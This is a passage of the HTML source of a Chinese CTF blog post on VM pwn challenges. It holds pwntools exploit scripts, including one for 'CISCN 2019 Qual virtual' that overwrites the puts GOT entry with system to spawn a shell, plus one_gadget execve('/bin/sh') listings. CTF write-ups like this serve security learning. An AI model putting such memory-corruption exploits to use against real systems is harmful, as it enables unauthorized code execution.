class="comment">#*(real_bp+0x8) = og</span></span><br><span class="line">code += p64(<span class="number">0x1e</span>)             <span class="comment">#exit</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">sla(<span class="string">&quot;Input your code&gt; &quot;</span>,code)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">0x4f2c5 execve(&quot;/bin/sh&quot;, rsp+0x40, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  rsp &amp; 0xf == 0</span></span><br><span class="line"><span class="string">  rcx == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0x4f322 execve(&quot;/bin/sh&quot;, rsp+0x40, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x40] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0x10a38c execve(&quot;/bin/sh&quot;, rsp+0x70, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x70] == NULL</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure></div>
+<h3 id="CISCN-2019-Qual-virtual"><a href="#CISCN-2019-Qual-virtual" class="headerlink" title="[CISCN 2019 Qual]virtual"></a>[CISCN 2019 Qual]virtual</h3><p>也是一道比较简单的问题，但是逆向的难度比上面高一点，函数稍微有点多，逆向能力太菜了，指令逻辑根本逆不太清，还是后面根据回显把每个指令过程猜了个差不多。洞极其好找，虚拟栈越界写，改掉指针劫持puts的got表，我用og和system都打了一遍本地都ok，但是远程通不了，不知道什么玄学原因没管了</p>
+<p><strong>exp</strong></p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#p = remote(&#x27;node4.buuoj.cn&#x27;,27895)</span></span><br><span class="line">p = process(<span class="string">&quot;./ciscn_2019_qual_virtual&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./2.23-0ubuntu3_amd64/libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line">se = <span class="keyword">lambda</span> data :p.send(data)</span><br><span class="line">sea = <span class="keyword">lambda</span> delim,data :p.sendafter(delim,data)</span><br><span class="line">sl = <span class="keyword">lambda</span> data :p.sendline(data)</span><br><span class="line">sla = <span class="keyword">lambda</span> delim,data :p.sendlineafter(delim,data)</span><br><span class="line">ru = <span class="keyword">lambda</span> delims,drop=<span class="literal">True</span> :p.recvuntil(delims,drop)</span><br><span class="line">uu32 = <span class="keyword">lambda</span> data :u32(data.ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> data :u64(data.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">lg = <span class="keyword">lambda</span> name,addr :log.success(name+<span class="string">&#x27;=&#x27;</span>+<span class="built_in">hex</span>(addr))</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">push</span></span><br><span class="line"><span class="string">pop</span></span><br><span class="line"><span class="string">add</span></span><br><span class="line"><span class="string">sub</span></span><br><span class="line"><span class="string">mul</span></span><br><span class="line"><span class="string">div</span></span><br><span class="line"><span class="string">load</span></span><br><span class="line"><span class="string">save</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">offset = -<span class="number">0x6f5d0</span>+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">puts_got = <span class="number">0x404020</span></span><br><span class="line">code = <span class="string">&quot;push push push save push add&quot;</span></span><br><span class="line">data = <span class="string">&quot;0 &#123;&#125; -4 &#123;&#125;&quot;</span>.<span class="built_in">format</span>(puts_got,offset)</span><br><span class="line"></span><br><span class="line">sla(<span class="string">&quot;Your program name:&quot;</span>,<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">sla(<span class="string">&quot;Your instruction:&quot;</span>,code)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">sla(<span class="string">&quot;Your stack data:&quot;</span>,data)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">0x45206 execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  rax == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0x4525a execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x30] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0xef9f4 execve(&quot;/bin/sh&quot;, rsp+0x50, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x50] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0xf0897 execve(&quot;/bin/sh&quot;, rsp+0x70, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x70] == NULL</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure></div>
+
+            </div>
+
+            
+                <div class="post-copyright-info">
+                    <div class="article-copyright-info-container">
+    <ul>
+        <li>Post title：VM Pwn记录</li>
+        <li>Post author：hash_hash</li>
+        <li>Create time：2023-01-14 21:11:11</li>
+        <li>
+            Post link：https://hash-hash.github.io/2023/01/14/VM-Pwn记录/
+        </li>
+        <li>
+            Copyright Notice：All articles in this blog are licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh">BY-NC-SA</a> unless stating additionally.
+        </li>
+    </ul>
+</div>
+
+                </div>
+            
+
+            
+                <ul class="post-tags-box">
+                    
+                        <li class="tag-item">
+                            <a href="/tags/vmpwn/">#vmpwn</a>&nbsp;
+                        </li>
+                    
+                </ul>
+            
+
+            
+                <div class="article-nav">
+                    
+                    
+                        <div class="article-next">
+                            <a class="next"
+                            rel="next"
+                            href="/2023/01/11/DASCTF-X-CBCTF-2022-Pwn/"
+                            >
+                                <span class="title flex-center">
+                                    <span class="post-nav-title-item">DASCTF X CBCTF 2022 Pwn</span>
+                                    <span class="post-nav-item">Next posts</span>
+                                </span>
+                                <span class="right arrow-icon flex-center">
+                                    <i class="fa-solid fa-chevron-right"></i>
+                                </span>
+                            </a>
+                        </div>
+                    
+                </div>
+            
+
+            
+        </div>
+
+        
+            <div class="toc-content-container">
+                <div class="post-toc-wrap">
+    <div class="post-toc">
+        <div style="font-size: 1.3rem;margin-top: 0; margin-bottom: 0.8rem; transition-duration: 0.1s;"><i class="fa-solid fa-list"></i> <strong>Contents</strong></div>
+        <ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#OGeek2019-Final-OVM"><span class="nav-text">[OGeek2019 Final]OVM</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%BD%91%E9%BC%8E%E6%9D%AF2020-boom2"><span class="nav-text">[网鼎杯2020]boom2</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#CISCN-2019-Qual-virtual"><span class="nav-text">[CISCN 2019 Qual]virtual</span></a></li></ol>
+    </div>
+</div>
+            </div>
+        
+    </div>
+</div>
+
+
+                
+
+            </div>
+
+
+
+        </div>
+
+        <div class="page-main-content-bottom">
+            <footer class="footer">
+    <div class="info-container">
+        <div class="copyright-info info-item">
+            &copy;
+            
+              <span>2022</span>
+              -
+            
+            2023&nbsp;<i class="fa-solid fa-heart icon-animate"></i>&nbsp;<a href="/">hash_hash. All Rights Reserved.</a>
+        </div>
+        
+        <div class="theme-info info-item">
+            Powered by <a target="_blank" href="https://hexo.io">Hexo</a>&nbsp;|&nbsp;Theme&nbsp;<a class="theme-version" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v0.4.4</a>
+        </div>
+        
+        
+        <script async data-pjax defer>
+            function odometer_init(){
+                    let el = document.getElementsByClassName('odometer');
+                    for (i = 0; i < el.length; i++) {
+                        od = new Odometer({
+                            el: el[i],
+                            format: '( ddd).dd',
+                            duration: 200
+                        });
+                    }
+            }
+            odometer_init();
+        </script>
+        <div id="start_time_div" style="display:none">
+            2022/8/17 11:45:14
+        </div>
+        
+            <div>
+                Blog up for <span class="odometer" id="runtime_days" ></span> days <span class="odometer" id="runtime_hours"></span> hrs <span class="odometer" id="runtime_minutes"></span> Min <span class="odometer" id="runtime_seconds"></span> Sec
+            </div>
+        
+        
+        
+    </div>  
+</footer>
+        </div>
+    </div>
+
+    
+        <div class="post-tools">
+            <div class="post-tools-container">
+    <ul class="tools-list">
+        <!-- TOC aside toggle -->
+        
+            <li class="tools-item page-aside-toggle">
+                <i class="fa-regular fa-outdent"></i>
+            </li>
+        
+
+        <!-- go comment -->
+        
+    </ul>
+</div>
+
+        </div>
+    
+
+    <div class="right-bottom-side-tools">
+        <div class="side-tools-container">
+    <ul class="side-tools-list">
+        <li class="tools-item tool-font-adjust-plus flex-center">
+            <i class="fa-solid fa-magnifying-glass-plus"></i>
+        </li>
+
+        <li class="tools-item tool-font-adjust-minus flex-center">
+            <i class="fa-solid fa-magnifying-glass-minus"></i>
+        </li>
+
+        <li class="tools-item tool-expand-width flex-center">
+            <i class="fa-solid fa-left-right"></i>
+        </li>
+
+        <li class="tools-item tool-dark-light-toggle flex-center">
+            <i class="fa-solid fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+
+        
+            <li class="tools-item tool-scroll-to-top flex-center">
+                <i class="fa-solid fa-arrow-up"></i>
+            </li>
+        
+
+        <li class="tools-item tool-scroll-to-bottom flex-center">
+            <i class="fa-solid fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="exposed-tools-list">
+        <li class="tools-item tool-toggle-show flex-center">
+            <i class="fa-solid fa-cog fa-spin"></i>
+        </li>
+        
+    </ul>
+</div>
+
+    </div>
+
+    <div class="image-viewer-container">
+    <img src="">
+</div>
+
+
+    
+
+</main>
+
+
+
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/main.js"></script>
+
+<script src="/js/header-shrink.js"></script>
+
+<script src="/js/back2top.js"></script>
+
+<script src="/js/dark-light-toggle.js"></script>
+
+
+
+
+
+    
+<script src="/js/code-copy.js"></script>
+
+
+
+
+    
+<script src="/js/lazyload.js"></script>
+
+
+
+
+    
+<script src="/js/runtime.js"></script>
+
+    
+<script src="/js/odometer.min.js"></script>
+
+    
+<link rel="stylesheet" href="/css/odometer-theme-minimal.css">
+
+
+
+<div class="post-scripts pjax">
+    
+        
+<script src="/js/toc-toggle.js"></script>
+
+<script src="/js/libs/anime.min.js"></script>
+
+<script src="/js/toc.js"></script>
+
+    
+</div>
+
+
+    
+<script src="/js/libs/pjax.min.js"></script>
+
+<script>
+    window.addEventListener('DOMContentLoaded', () => {
+        window.pjax = new Pjax({
+            selectors: [
+                'head title',
+                '.page-container',
+                '.pjax'
+            ],
+            history: true,
+            debug: false,
+            cacheBust: false,
+            timeout: 0,
+            analytics: false,
+            currentUrlFullReload: false,
+            scrollRestoration: false,
+            // scrollTo: true,
+        });
+
+        document.addEventListener('pjax:send', () => {
+            REDEFINE.utils.pjaxProgressBarStart();
+        });
+
+        document.addEventListener('pjax:complete', () => {
+            REDEFINE.utils.pjaxProgressBarEnd();
+            window.pjax.executeScripts(document.querySelectorAll('script[data-pjax], .pjax script'));
+            REDEFINE.refresh();
+        });
+    });
+</script>
+
+
+
+</body>
+</html>
